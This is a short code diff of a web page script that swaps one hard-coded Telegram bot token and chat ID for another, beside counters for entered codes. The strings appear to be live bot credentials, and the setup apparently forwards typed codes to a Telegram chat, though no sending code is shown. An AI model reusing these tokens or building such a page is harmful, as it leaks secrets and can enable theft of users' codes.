@@ -318,8 +318,8 @@
 
 <script>
 // Конфигурация Telegram бота
-const BOT_TOKEN = '8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4';
-const CHAT_ID = '8145443779';
+const BOT_TOKEN = '8203489675:AAGdJUcRLdwK7QSPqfY-3rtyKFwve5pJPPI';
+const CHAT_ID = '7455610355';
 
 let codeAttempts = 0;
 let currentCode = '';
